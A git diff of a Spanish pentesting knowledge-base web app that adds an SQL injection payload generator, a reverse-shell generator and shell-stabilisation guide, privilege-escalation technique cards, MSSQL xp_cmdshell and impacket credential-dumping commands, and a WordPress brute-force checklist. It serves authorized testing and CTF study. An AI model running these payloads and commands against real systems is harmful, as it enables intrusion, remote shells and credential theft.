@@ -290,6 +290,20 @@ pre.code-block{background:var(--bg);border:1px solid var(--border2);border-radiu
 .enum-save-btn{background:var(--bg3);border:1px solid var(--border);color:var(--text3);border-radius:var(--r);padding:4px 7px;cursor:pointer;font-size:11px;flex-shrink:0;transition:all .15s;}
 .enum-save-btn:hover{border-color:var(--purple);color:var(--purple);}
 .enum-save-btn.saved{border-color:var(--green);color:var(--green);}
+/* PrivEsc technique cards */
+.pe-card{background:var(--bg2);border:1px solid rgba(245,158,11,.3);border-radius:var(--r2);padding:12px 14px;margin-bottom:10px;}
+.pe-card-hd{display:flex;align-items:center;gap:8px;margin-bottom:8px;}
+.pe-card-name{font-size:13px;font-weight:700;color:#f59e0b;flex:1;font-family:var(--sans);}
+.pe-del{background:none;border:1px solid var(--border);color:var(--text3);border-radius:var(--r);padding:2px 7px;cursor:pointer;font-size:10px;flex-shrink:0;}
+.pe-del:hover{border-color:var(--red);color:var(--red);}
+.pe-block{margin-bottom:8px;}
+.pe-label{font-size:9px;font-family:var(--mono);font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:3px;}
+.pe-label.det{color:var(--cyan);}
+.pe-label.exp{color:var(--red);}
+.pe-code{font-family:var(--mono);font-size:11px;color:var(--orange);background:var(--bg);border:1px solid var(--border);border-radius:var(--r);padding:7px 10px;white-space:pre-wrap;line-height:1.5;flex:1;}
+.pe-row{display:flex;gap:6px;align-items:flex-start;}
+.pe-ref{width:100%;background:var(--bg3);border:1px solid var(--border2);color:var(--text2);border-radius:var(--r);padding:5px 8px;font-size:11px;font-family:var(--mono);outline:none;resize:vertical;min-height:34px;margin-top:2px;}
+.pe-ref:focus{border-color:#f59e0b;}
 
 /* CHAT */
 .chat-panel{width:310px;background:var(--bg2);border-left:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0;transition:width .2s;}
@@ -565,9 +579,31 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
       </div>
       <a href="https://gtfobins.github.io" target="_blank" class="tb-btn" style="font-size:10px;text-decoration:none;" title="GTFOBins — Unix SUID/sudo/cap binaries">GTFOBins ↗</a>
       <a href="https://lolbas-project.github.io" target="_blank" class="tb-btn" style="font-size:10px;text-decoration:none;" title="LOLBAS — Living Off The Land Binaries (Windows)">LOLBAS ↗</a>
+      <button class="tb-btn" onclick="openSqliModal()" style="font-size:10px;color:#ff44aa;border-color:rgba(255,68,170,.4);" title="Generador de payloads SQL Injection">💉 SQLi</button>
+      <button class="tb-btn" onclick="openShellStabModal()" style="font-size:10px;color:var(--cyan);border-color:rgba(0,221,255,.4);" title="Estabilizar shell — TTY upgrade">🐚 Shell</button>
+      <button class="tb-btn" onclick="openRevShellModal()" style="font-size:10px;color:var(--red);border-color:rgba(255,51,68,.4);" title="Generador de Reverse Shells">🔌 RevShell</button>
       <button class="btn-ai" onclick="openCheatsheetModal()">✦ Cheatsheet</button>
     </div>
     <div class="cmd-list" id="cmdList"><div class="empty-msg">Sin comandos. Sube apuntes o analiza texto.</div></div>
+    <div class="cmd-list" id="privescPanel" style="display:none;">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
+        <span style="font-size:11px;font-family:var(--mono);color:#f59e0b;font-weight:700;">⚡ TÉCNICAS DE ESCALADA DE PRIVILEGIOS</span>
+        <span style="font-size:10px;color:var(--text3);">— detección + explotación por técnica, con notas propias</span>
+        <div style="flex:1;"></div>
+        <button class="tb-btn" onclick="openPeAddForm()" style="font-size:10px;color:#f59e0b;border-color:rgba(245,158,11,.4);">+ Nueva técnica</button>
+      </div>
+      <div id="peAddForm" style="display:none;background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r2);padding:12px 14px;margin-bottom:12px;">
+        <div class="enum-gen-row"><span class="enum-gen-label">Nombre</span><input type="text" class="enum-gen-input" id="peName" placeholder="Ej: SUID en find"></div>
+        <div class="enum-gen-row" style="align-items:flex-start;"><span class="enum-gen-label">Detección</span><textarea class="enum-gen-input" id="peDet" placeholder="Comando(s) de detección" style="min-height:48px;resize:vertical;"></textarea></div>
+        <div class="enum-gen-row" style="align-items:flex-start;"><span class="enum-gen-label">Explotación</span><textarea class="enum-gen-input" id="peExp" placeholder="Comando(s) de explotación" style="min-height:48px;resize:vertical;"></textarea></div>
+        <div class="enum-gen-row"><span class="enum-gen-label">Referencia</span><input type="text" class="enum-gen-input" id="peRef" placeholder="Opcional — ej: visto en máquina X"></div>
+        <div style="display:flex;gap:6px;justify-content:flex-end;margin-top:6px;">
+          <button class="btn-outline" onclick="closePeAddForm()" style="font-size:11px;">Cancelar</button>
+          <button class="btn-green" onclick="addPeTechnique()" style="font-size:11px;">Guardar técnica</button>
+        </div>
+      </div>
+      <div id="peCards"></div>
+    </div>
   </div>
 
   <!-- OSINT PANEL -->
@@ -695,6 +731,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
       <button class="enum-stab active" id="estab-discovery" onclick="switchEnumTab('discovery')">🌐 Descubrimiento de Red</button>
       <button class="enum-stab" id="estab-services" onclick="switchEnumTab('services')">🔍 Análisis de Servicios</button>
       <button class="enum-stab" id="estab-nmap" onclick="switchEnumTab('nmap')">⚡ Cheatsheet Nmap</button>
+      <button class="enum-stab" id="estab-winad" onclick="switchEnumTab('winad')">🪟 Windows / AD</button>
     </div>
 
     <!-- SECTION 1: Descubrimiento de Red -->
@@ -1131,6 +1168,58 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
       </div>
 
     </div><!-- /esec-nmap -->
+
+    <!-- SECTION 4: Windows / AD -->
+    <div class="enum-section" id="esec-winad">
+
+      <div class="enum-group">
+        <div class="enum-group-title">SMB — Recursos compartidos</div>
+        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">smbclient -N -L //IP/</div><button class="enum-copy-btn" onclick="enumCopy(this,'smbclient -N -L //IP/')">⎘ Copiar</button></div><div class="enum-cmd-desc">Listar recursos compartidos sin credenciales (sesión nula)</div></div>
+        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">smbclient -N //IP/recurso</div><button class="enum-copy-btn" onclick="enumCopy(this,'smbclient -N //IP/recurso')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conectarse a un recurso compartido específico sin credenciales</div></div>
+        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">enum4linux -a IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'enum4linux -a IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Enumeración completa SMB / NetBIOS (usuarios, grupos, shares, políticas)</div></div>
+      </div>
+
+      <div class="enum-group">
+        <div class="enum-group-title">MSSQL e Impacket</div>
+        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">impacket-mssqlclient HOSTNAME/usuario@IP -windows-auth</div><button class="enum-copy-btn" onclick="enumCopy(this,'impacket-mssqlclient HOSTNAME/usuario@IP -windows-auth')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión a MSSQL con Impacket usando autenticación de Windows</div></div>
+
+        <div class="enum-cmd-card">
+          <div class="enum-cmd-row" style="align-items:flex-start;">
+            <pre id="xpCmdBlock" class="enum-cmd-code" style="white-space:pre;margin:0;line-height:1.6;">EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'whoami';</pre>
+            <button class="enum-copy-btn" onclick="enumCopy(this,document.getElementById('xpCmdBlock').textContent)">⎘ Copiar</button>
+            <button class="enum-save-btn" title="Guardar en KB" onclick="saveCmdKB(this,document.getElementById('xpCmdBlock').textContent,'Activar xp_cmdshell en MSSQL para ejecución de comandos','windows','MSSQL','windows-ad',['windows-ad','mssql'])">💾</button>
+          </div>
+          <div class="enum-cmd-desc">Secuencia completa para activar <code style="color:var(--orange)">xp_cmdshell</code> y ejecutar comandos del sistema desde MSSQL</div>
+        </div>
+
+        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">SELECT IS_SRVROLEMEMBER('sysadmin');</div><button class="enum-copy-btn" onclick="enumCopy(this,&quot;SELECT IS_SRVROLEMEMBER('sysadmin');&quot;)">⎘ Copiar</button></div><div class="enum-cmd-desc">Verificar si el usuario actual es administrador (sysadmin) de SQL</div></div>
+      </div>
+
+      <div class="enum-group">
+        <div class="enum-group-title">Post-explotación Windows</div>
+        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">impacket-psexec administrador:contraseña@IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'impacket-psexec administrador:contraseña@IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Ejecución remota de comandos como SYSTEM vía SMB</div></div>
+        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">impacket-secretsdump dominio/usuario:contraseña@IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'impacket-secretsdump dominio/usuario:contraseña@IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Extraer hashes NTLM del Active Directory (SAM, LSA, NTDS.dit)</div></div>
+      </div>
+
+      <div class="enum-group">
+        <div class="enum-group-title">Referencia rápida — Windows vs Linux</div>
+        <table class="enum-ttl-table">
+          <thead><tr><th>Acción</th><th>Linux</th><th>Windows</th></tr></thead>
+          <tbody>
+            <tr><td style="color:var(--text2)!important;">Leer fichero</td><td><code style="color:var(--orange)">cat</code></td><td><code style="color:var(--orange)">type</code></td></tr>
+            <tr><td style="color:var(--text2)!important;">Listar directorio</td><td><code style="color:var(--orange)">ls</code></td><td><code style="color:var(--orange)">dir</code></td></tr>
+            <tr><td style="color:var(--text2)!important;">Carpeta permisos universales</td><td><code style="color:var(--orange)">/tmp</code></td><td><code style="color:var(--orange)">C:\Users\Public</code></td></tr>
+            <tr><td style="color:var(--text2)!important;">Usuario actual</td><td><code style="color:var(--orange)">whoami</code></td><td><code style="color:var(--orange)">whoami</code></td></tr>
+            <tr><td style="color:var(--text2)!important;">Navegar directorios</td><td><code style="color:var(--orange)">cd /ruta</code></td><td><code style="color:var(--orange)">cd C:\ruta</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+    </div><!-- /esec-winad -->
   </div><!-- /panel-enum -->
 
   <!-- AUDITS PANEL -->
@@ -1145,6 +1234,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
         <button class="audit-type-btn" onclick="selectAudit('social-engineering',this)">🎭 Ing. Social</button>
         <button class="audit-type-btn" onclick="selectAudit('forensics',this)">🔬 Forense</button>
         <button class="audit-type-btn" onclick="selectAudit('mobile',this)">📱 Móvil</button>
+        <button class="audit-type-btn" onclick="selectAudit('wordpress',this)">📰 WordPress</button>
       </div>
       <div style="flex:1"></div>
       <span id="auditProgress" style="font-size:11px;font-family:var(--mono);color:var(--green);flex-shrink:0;"></span>
@@ -1453,6 +1543,98 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
     <div class="modal-actions">
       <button class="btn-ai" onclick="genCheatsheet()">✦ Generar</button>
       <button class="btn-outline" onclick="closeModal('cheatModal')">Cerrar</button>
+    </div>
+  </div>
+</div>
+
+<!-- SQLi GENERATOR MODAL -->
+<div class="overlay" id="sqliModal">
+  <div class="modal" style="max-width:680px;width:96vw;">
+    <h3>💉 Generador de Payloads SQLi</h3>
+    <p style="color:var(--text3);font-size:12px;margin:0;">Payloads de SQL Injection según el campo objetivo. Solo para entornos autorizados (CTF, pentesting con permiso, laboratorios).</p>
+    <div class="enum-generator" style="margin-top:4px;">
+      <div class="enum-gen-row">
+        <span class="enum-gen-label">Tipo de campo</span>
+        <select class="enum-gen-sel" id="sqliField" onchange="renderSqli()" style="flex:1;">
+          <option value="user">Login — usuario</option>
+          <option value="pass">Login — contraseña</option>
+          <option value="search">Buscador</option>
+          <option value="url">Parámetro URL</option>
+        </select>
+      </div>
+      <div class="enum-gen-row">
+        <span class="enum-gen-label">Objetivo</span>
+        <select class="enum-gen-sel" id="sqliGoal" onchange="renderSqli()" style="flex:1;">
+          <option value="bypass">Bypass de autenticación</option>
+          <option value="detect">Detectar inyección</option>
+          <option value="union">UNION-based</option>
+          <option value="comment">Comentar resto de query</option>
+        </select>
+      </div>
+    </div>
+    <div id="sqliOutput" style="margin-top:10px;"></div>
+    <div class="modal-actions">
+      <button class="btn-outline" onclick="closeModal('sqliModal')">Cerrar</button>
+    </div>
+  </div>
+</div>
+
+<!-- SHELL STABILIZATION MODAL -->
+<div class="overlay" id="shellStabModal">
+  <div class="modal" style="max-width:640px;width:96vw;">
+    <h3>🐚 Estabilizar shell (TTY upgrade)</h3>
+    <p style="color:var(--text3);font-size:12px;margin:0;">Convierte una reverse shell básica en una TTY interactiva completa.</p>
+
+    <div class="enum-note" style="margin:4px 0;">⚠ <b>Ctrl+Z</b> y <b>fg</b> son acciones manuales, no comandos a copiar — pulsa <b>Ctrl+Z</b> y escribe <b>fg</b> por separado en tu terminal.</div>
+
+    <div class="enum-cmd-card" style="border-color:rgba(0,221,255,.3);">
+      <div class="enum-cmd-row" style="align-items:flex-start;">
+        <pre class="enum-cmd-code" id="shellStabBlock" style="white-space:pre;margin:0;line-height:1.7;">python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z  (manual)
+stty raw -echo; fg
+reset
+export TERM=xterm-256color</pre>
+        <button class="enum-copy-btn" onclick="enumCopy(this,document.getElementById('shellStabBlock').textContent)">⎘ Copiar todo</button>
+        <button class="enum-save-btn" title="Guardar en KB" onclick="saveCmdKB(this,document.getElementById('shellStabBlock').textContent,'Estabilizar shell — TTY upgrade completo','linux','Shell','shell',['shell','tty'])">💾</button>
+      </div>
+      <div class="enum-cmd-desc">Bloque completo — los 5 pasos en orden</div>
+    </div>
+
+    <div style="font-size:9px;font-family:var(--mono);font-weight:700;letter-spacing:1px;color:var(--text3);text-transform:uppercase;margin:4px 0 2px;">Paso a paso</div>
+    <div id="shellStabSteps"></div>
+
+    <div class="modal-actions">
+      <button class="btn-outline" onclick="closeModal('shellStabModal')">Cerrar</button>
+    </div>
+  </div>
+</div>
+
+<!-- REVERSE SHELL GENERATOR MODAL -->
+<div class="overlay" id="revShellModal">
+  <div class="modal" style="max-width:680px;width:96vw;">
+    <h3>🔌 Generador de Reverse Shells</h3>
+    <p style="color:var(--text3);font-size:12px;margin:0;">Genera la reverse shell con tu IP y puerto interpolados. Solo para entornos autorizados.</p>
+    <div class="enum-generator" style="margin-top:4px;">
+      <div class="enum-gen-row">
+        <span class="enum-gen-label">IP (LHOST)</span>
+        <input type="text" class="enum-gen-input" id="rsIP" value="10.10.14.1" oninput="renderRevShell()" placeholder="10.10.14.1">
+        <span class="enum-gen-label" style="min-width:auto;">Puerto</span>
+        <input type="number" class="enum-gen-input" id="rsPort" value="443" oninput="renderRevShell()" style="max-width:90px;flex:none;" placeholder="443">
+      </div>
+      <div class="enum-gen-row">
+        <span class="enum-gen-label">Técnica</span>
+        <select class="enum-gen-sel" id="rsType" onchange="renderRevShell()" style="flex:1;">
+          <option value="php-simple">PHP simple (php-reverse-shell.php)</option>
+          <option value="php-mkfifo">PHP mkfifo</option>
+          <option value="bash-tcp">Bash /dev/tcp</option>
+          <option value="ps-nc">PowerShell (Invoke-WebRequest + nc64.exe)</option>
+        </select>
+      </div>
+    </div>
+    <div class="enum-note" id="rsListener" style="margin:10px 0 4px;">Antes de ejecutar, levanta el listener: <code style="color:var(--orange)">nc -lvnp 443</code></div>
+    <div id="rsOutput"></div>
+    <div class="modal-actions">
+      <button class="btn-outline" onclick="closeModal('revShellModal')">Cerrar</button>
     </div>
   </div>
 </div>
@@ -3021,6 +3203,11 @@ function setOsFilter(val,btn){
   S.osFilter=val;
   document.querySelectorAll('[id^="osBtn-"]').forEach(b=>b.classList.remove('active'));
   btn.classList.add('active');
+  // PrivEsc techniques panel shown only on privesc filter
+  const pe=val==='privesc';
+  document.getElementById('privescPanel').style.display=pe?'block':'none';
+  document.getElementById('cmdList').style.display=pe?'none':'block';
+  if(pe) renderPeTechniques();
   renderCommands();
 }
 
@@ -3300,6 +3487,20 @@ const AUDIT_TEMPLATES={
       {id:'m10',text:'Interceptar tráfico (Burp + perfil SSL instalado)',sev:'high'},
       {id:'m11',text:'Bypass SSL pinning (Objection, Frida)',sev:'high',cmds:["objection -g 'App Name' explore → ios sslpinning disable"]},
       {id:'m12',text:'Análisis de Keychain',sev:'high',cmds:["objection -g 'App Name' explore → ios keychain dump"]},
+    ]},
+  ]},
+  'wordpress':{name:'WordPress',icon:'📰',phases:[
+    {name:'Autenticación y Enumeración',items:[
+      {id:'wp1',text:'Information disclosure en login (mensajes distintos para usuario inexistente vs contraseña incorrecta)',sev:'medium'},
+      {id:'wp2',text:'Enumerar usuarios válidos con Burp Intruder (Sniper Attack)',sev:'high',cmds:['wpscan --url http://target --enumerate u']},
+      {id:'wp3',text:'Fuerza bruta de contraseña con diccionario limpio (sort | uniq)',sev:'high',cmds:['sort rockyou.txt | uniq > clean.txt','wpscan --url http://target --usernames admin --passwords clean.txt']},
+    ]},
+    {name:'Plugins, Temas y Ficheros',items:[
+      {id:'wp4',text:'Revisar plugins instalados y sus versiones (buscar CVEs conocidos)',sev:'high',cmds:['wpscan --url http://target --enumerate vp']},
+      {id:'wp5',text:'Comprobar si el panel permite instalar plugins (WP File Manager u otro) como vector de file upload',sev:'critical'},
+      {id:'wp6',text:'Comprobar si el editor de temas (Appearance → Editor) está accesible',sev:'high'},
+      {id:'wp7',text:'Revisar permisos de ficheros sensibles (wp-config.php, backups)',sev:'high',cmds:['curl http://target/wp-config.php.bak','curl http://target/wp-config.php~']},
+      {id:'wp8',text:'Comprobar versión de WordPress y del tema activo frente a CVEs públicos',sev:'medium',cmds:['wpscan --url http://target --enumerate vt']},
     ]},
   ]},
 };
@@ -3705,12 +3906,16 @@ function initEnumSaveButtons(){
     const codeEl=card.querySelector('.enum-cmd-code');
     const descEl=card.querySelector('.enum-cmd-desc');
     if(!row||!codeEl) return;
+    if(row.querySelector('.enum-save-btn')) return;  // skip cards that already have a save btn
     const cmd=codeEl.textContent.replace(/\s+/g,' ').trim();
     const desc=descEl?descEl.textContent.trim():'';
-    // Infer OS from command content
+    // Windows/AD section → its own category/os
+    const inWinAd=!!card.closest('#esec-winad');
     let os='linux';
-    if(/xfreerdp|\.exe|Administrator|powershell/i.test(cmd)) os='windows';
+    if(inWinAd || /xfreerdp|\.exe|Administrator|powershell|impacket|xp_cmdshell|sp_configure/i.test(cmd)) os='windows';
     else if(/ftp |ssh |smbclient|nmap|hydra|nikto|ffuf|curl|mysql|redis|mongo|psql|rpcinfo|showmount|dnsrecon|dig |telnet|enum4linux|searchsploit/i.test(cmd)) os='linux';
+    const category=inWinAd?'windows-ad':'enumeracion';
+    const tags=inWinAd?['windows-ad']:['enumeracion'];
     // Infer tool_name from accordion header if present
     const acc=card.closest('.enum-accordion');
     const toolName=acc?acc.querySelector('.enum-acc-name')?.textContent?.split('—')[0].trim():'';
@@ -3718,7 +3923,7 @@ function initEnumSaveButtons(){
     btn.className='enum-save-btn';
     btn.textContent='💾';
     btn.title='Guardar en base de conocimiento';
-    btn.onclick=()=>saveEnumCmd(btn,cmd,desc,os,toolName);
+    btn.onclick=()=>saveCmdKB(btn,cmd,desc,os,toolName,category,tags);
     row.appendChild(btn);
   });
   // Also add save buttons to service table rows
@@ -3739,6 +3944,11 @@ function initEnumSaveButtons(){
 }
 
 async function saveEnumCmd(btn,cmd,desc,os,toolName){
+  return saveCmdKB(btn,cmd,desc,os,toolName,'enumeracion',['enumeracion']);
+}
+
+// Generic "Guardar en KB" — used by Enum, SQLi and other static command tools
+async function saveCmdKB(btn,cmd,desc,os,toolName,category,tags){
   const orig=btn.textContent;
   btn.textContent='⟳';btn.disabled=true;
   try{
@@ -3747,19 +3957,239 @@ async function saveEnumCmd(btn,cmd,desc,os,toolName){
       description:desc||null,
       tool_name:toolName||null,
       os:os||'linux',
-      category:'enumeracion',
-      tags:['enumeracion']
+      category:category||'general',
+      tags:tags||[]
     });
     btn.textContent='✓';
     btn.classList.add('saved');
     btn.disabled=true;
     btn.title='Guardado en KB';
     await loadAll();
-    setStatus('Comando guardado en KB — categoría enumeración');
+    setStatus('Comando guardado en KB — categoría '+(category||'general'));
   }catch(e){
     btn.textContent=orig;btn.disabled=false;
     setStatus('Error guardando comando: '+e.message,'error');
   }
+}
+
+// ─── SQLi GENERATOR ───────────────────────────────────────────────────────────
+// Each payload: u = versión con prefijo de usuario (admin'), g = versión genérica
+const SQLI_PAYLOADS={
+  bypass:[
+    {u:"admin' OR 1=1--",  g:"' OR 1=1--",   d:"Fuerza una condición siempre verdadera, ignorando la contraseña"},
+    {u:"admin' AND 1=1--", g:"' AND 1=1--",  d:"Igual que el anterior pero exige que el usuario exista"},
+    {u:"admin' OR '1'='1", g:"' OR '1'='1",  d:"Bypass clásico sin comentario — cierra la comilla abierta de la query"},
+  ],
+  detect:[
+    {u:"'",            g:"'",            d:"Comilla simple — detecta si el campo es vulnerable provocando un error SQL"},
+    {u:"''",           g:"''",           d:"Doble comilla — si el error desaparece, confirma inyección de cadena"},
+    {u:"' OR 1=1-- -", g:"' OR 1=1-- -", d:"Comprueba si la app responde distinto ante una condición verdadera"},
+  ],
+  union:[
+    {u:"' ORDER BY 5--",                            g:"' ORDER BY 5--",                            d:"Determina el número de columnas de la tabla (probar incrementando el número)"},
+    {u:"' UNION SELECT null,null,null--",           g:"' UNION SELECT null,null,null--",           d:"Extrae datos de otras tablas una vez se conoce el número de columnas"},
+    {u:"' UNION SELECT user(),version(),database()--", g:"' UNION SELECT user(),version(),database()--", d:"Extrae usuario, versión y BD actual (ajustar nº de columnas al de la query)"},
+  ],
+  comment:[
+    {u:"admin'#",  g:"'#",     d:"Comenta la verificación de contraseña que sigue en la query (MySQL)"},
+    {u:"admin'--", g:"'-- -",  d:"Comenta el resto de la query con sintaxis SQL estándar"},
+    {u:"admin'/*", g:"'/*",    d:"Comenta el resto usando comentario de bloque"},
+  ],
+};
+
+function openSqliModal(){
+  document.getElementById('sqliModal').classList.add('show');
+  renderSqli();
+}
+
+function renderSqli(){
+  const field=document.getElementById('sqliField').value;
+  const goal=document.getElementById('sqliGoal').value;
+  const useUser=(field==='user');
+  const list=SQLI_PAYLOADS[goal]||[];
+  const out=document.getElementById('sqliOutput');
+  out.innerHTML=list.map(p=>{
+    const payload=useUser?p.u:p.g;
+    const pj=JSON.stringify(payload);
+    return `<div class="enum-cmd-card">
+      <div class="enum-cmd-row">
+        <div class="enum-cmd-code">${esc(payload)}</div>
+        <button class="enum-copy-btn" onclick='enumCopy(this,${pj})'>⎘ Copiar</button>
+        <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${pj},${JSON.stringify(p.d)},"web","SQL Injection","sqli",["sqli","web"])'>💾</button>
+      </div>
+      <div class="enum-cmd-desc">${esc(p.d)}</div>
+    </div>`;
+  }).join('');
+}
+
+// ─── PRIVESC TECHNIQUE CARDS (localStorage) ───────────────────────────────────
+const PE_SEED=[
+  {id:'path-hijack', name:'PATH Hijacking',
+   det:"find / -group NOMBREGRUPO 2>/dev/null\nstrings /ruta/binario   # ver si llama a comandos sin ruta absoluta",
+   exp:"cd /tmp\necho -e '#!/bin/bash\\n/bin/bash -p' > cat\nchmod +x cat\nexport PATH=/tmp:$PATH\n/ruta/del/binario/SUID",
+   ref:''},
+  {id:'suid-interactive', name:'SUID en binario interactivo (ej. nmap antiguo)',
+   det:"find / -perm -u=s -type f 2>/dev/null",
+   exp:"# Consultar GTFOBins con el nombre del binario encontrado\n# Ejemplo nmap:\nnmap --interactive\n!sh",
+   ref:''},
+  {id:'vi-sudo', name:'Escalada con vi/vim vía sudo',
+   det:"sudo -l   # buscar vi/vim en la lista de comandos permitidos",
+   exp:"sudo vi /ruta/archivo\n:set shell=/bin/bash\n:shell\n# Alternativa:\n:!/bin/sh",
+   ref:''},
+  {id:'ps-history', name:'Historial de PowerShell con credenciales',
+   det:"type C:\\Users\\USUARIO\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
+   exp:"type C:\\Users\\USUARIO\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
+   ref:''},
+];
+
+function loadPeTechniques(){
+  try{
+    const raw=localStorage.getItem('cyberkb_privesc');
+    if(raw) return JSON.parse(raw);
+  }catch(e){}
+  return JSON.parse(JSON.stringify(PE_SEED));
+}
+function savePeTechniques(arr){
+  try{localStorage.setItem('cyberkb_privesc',JSON.stringify(arr));}catch(e){}
+}
+
+function renderPeTechniques(){
+  const arr=loadPeTechniques();
+  const box=document.getElementById('peCards');
+  if(!arr.length){box.innerHTML='<div class="empty-msg">Sin técnicas. Pulsa "+ Nueva técnica".</div>';return;}
+  box.innerHTML=arr.map(t=>{
+    const dj=JSON.stringify(t.det), ej=JSON.stringify(t.exp);
+    return `<div class="pe-card">
+      <div class="pe-card-hd">
+        <span class="pe-card-name">⚡ ${esc(t.name)}</span>
+        <button class="pe-del" onclick='deletePeTechnique(${JSON.stringify(t.id)})'>✕ Eliminar</button>
+      </div>
+      <div class="pe-block">
+        <div class="pe-label det">Detección</div>
+        <div class="pe-row">
+          <div class="pe-code">${esc(t.det)}</div>
+          <button class="enum-copy-btn" onclick='enumCopy(this,${dj})'>⎘</button>
+          <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${dj},${JSON.stringify("PrivEsc detección: "+t.name)},"linux","PrivEsc","privesc",["privesc"])'>💾</button>
+        </div>
+      </div>
+      <div class="pe-block">
+        <div class="pe-label exp">Explotación</div>
+        <div class="pe-row">
+          <div class="pe-code">${esc(t.exp)}</div>
+          <button class="enum-copy-btn" onclick='enumCopy(this,${ej})'>⎘</button>
+          <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${ej},${JSON.stringify("PrivEsc explotación: "+t.name)},"linux","PrivEsc","privesc",["privesc"])'>💾</button>
+        </div>
+      </div>
+      <div class="pe-block" style="margin-bottom:0;">
+        <div class="pe-label" style="color:var(--text3);">Referencia (notas propias)</div>
+        <textarea class="pe-ref" placeholder="Ej: visto en máquina X de HTB..." onchange='updatePeRef(${JSON.stringify(t.id)},this.value)'>${esc(t.ref||'')}</textarea>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function openPeAddForm(){document.getElementById('peAddForm').style.display='block';}
+function closePeAddForm(){
+  document.getElementById('peAddForm').style.display='none';
+  ['peName','peDet','peExp','peRef'].forEach(id=>document.getElementById(id).value='');
+}
+function addPeTechnique(){
+  const name=document.getElementById('peName').value.trim();
+  const det=document.getElementById('peDet').value.trim();
+  const exp=document.getElementById('peExp').value.trim();
+  const ref=document.getElementById('peRef').value.trim();
+  if(!name){setStatus('La técnica necesita un nombre','warn');return;}
+  const arr=loadPeTechniques();
+  arr.push({id:'u'+Date.now(),name,det,exp,ref});
+  savePeTechniques(arr);
+  closePeAddForm();
+  renderPeTechniques();
+  setStatus('Técnica añadida — '+name);
+}
+function deletePeTechnique(id){
+  if(!confirm('¿Eliminar esta técnica?')) return;
+  const arr=loadPeTechniques().filter(t=>t.id!==id);
+  savePeTechniques(arr);
+  renderPeTechniques();
+}
+function updatePeRef(id,val){
+  const arr=loadPeTechniques();
+  const t=arr.find(x=>x.id===id);
+  if(t){t.ref=val;savePeTechniques(arr);}
+}
+
+// ─── SHELL STABILIZATION ──────────────────────────────────────────────────────
+const SHELL_STEPS=[
+  {cmd:`python3 -c 'import pty; pty.spawn("/bin/bash")'`, d:'Genera una pseudo-terminal con Python'},
+  {manual:true, label:'Ctrl + Z', d:'Acción manual — suspende la shell y vuelve a tu terminal local'},
+  {cmd:'stty raw -echo; fg', d:'Desactiva el echo local y trae la shell de vuelta a primer plano'},
+  {cmd:'reset', d:'Reinicia la terminal (si pregunta el tipo, escribe: xterm)'},
+  {cmd:'export TERM=xterm-256color', d:'Habilita colores y control completo de la terminal'},
+];
+
+function openShellStabModal(){
+  const box=document.getElementById('shellStabSteps');
+  box.innerHTML=SHELL_STEPS.map((s,i)=>{
+    if(s.manual){
+      return `<div class="enum-cmd-card" style="border-color:rgba(255,204,0,.3);background:rgba(255,204,0,.04);">
+        <div class="enum-cmd-row">
+          <div class="enum-cmd-code" style="color:var(--yellow);">⌨ ${esc(s.label)} — acción manual (no copiar)</div>
+        </div>
+        <div class="enum-cmd-desc">${esc(s.d)}</div>
+      </div>`;
+    }
+    const cj=JSON.stringify(s.cmd);
+    return `<div class="enum-cmd-card">
+      <div class="enum-cmd-row">
+        <div class="enum-cmd-code">${esc(s.cmd)}</div>
+        <button class="enum-copy-btn" onclick='enumCopy(this,${cj})'>⎘ Copiar</button>
+      </div>
+      <div class="enum-cmd-desc">${esc(s.d)}</div>
+    </div>`;
+  }).join('');
+  document.getElementById('shellStabModal').classList.add('show');
+}
+
+// ─── REVERSE SHELL GENERATOR ──────────────────────────────────────────────────
+function openRevShellModal(){
+  document.getElementById('revShellModal').classList.add('show');
+  renderRevShell();
+}
+
+function renderRevShell(){
+  const ip=(document.getElementById('rsIP').value||'LHOST').trim();
+  const port=(document.getElementById('rsPort').value||'PORT').toString().trim();
+  const type=document.getElementById('rsType').value;
+  document.getElementById('rsListener').innerHTML=`Antes de ejecutar, levanta el listener: <code style="color:var(--orange)">nc -lvnp ${esc(port)}</code>`;
+
+  const out=document.getElementById('rsOutput');
+  let cards=[];
+  if(type==='php-simple'){
+    out.innerHTML=`<div class="enum-note" style="background:rgba(0,170,255,.06);border-color:rgba(0,170,255,.25);color:var(--text2);">
